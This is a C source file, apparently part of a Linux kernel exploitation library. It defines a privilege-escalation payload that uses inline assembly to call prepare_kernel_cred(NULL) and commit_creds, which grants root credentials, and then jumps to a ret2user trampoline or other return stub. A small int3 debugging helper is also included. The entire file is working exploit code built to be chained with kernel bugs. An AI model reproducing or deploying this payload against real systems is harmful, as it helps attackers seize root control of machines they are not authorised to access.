#include "privesc.h"
#include "utils.h"

/* Privesc from commit_creds(prepare_kernel_cred(NULL)); */
void privesc_kcred(uintptr_t commit_creds,
                   uintptr_t prepare_kernel_cred,
                   void (*jmp_ret)(void))  // Function pointer to jump back
{
    INFO("Running privesc from commit_creds(prepare_kernel_cred(0)");

    __asm__ __volatile__ (
        ".intel_syntax noprefix;\n"
        "mov rdi, 0;\n"                     // rdi = NULL
        "mov rax, %[pkc];\n"
        "call rax;\n"                       // prepare_kernel_cred(NULL)
        "mov rdi, rax;\n"                   // rdi = return value (cred)
        "mov rax, %[cc];\n"
        "call rax;\n"                       // commit_creds(cred)
        "mov rax, %[ret];\n"
        "jmp rax;\n"                        // jmp to ret2user_trampoline or any return stub
        ".att_syntax;"
        :
        : [cc]  "r"(commit_creds),
          [pkc] "r"(prepare_kernel_cred),
          [ret] "r"(jmp_ret)
        : "rax", "rdi"
    );
}

/* For debugging use */
void test_ret_addr() {
    __asm__ __volatile__ (
        ".intel_syntax noprefix;\n"
        "int3;\n"
        ".att_syntax;\n"
    );
}
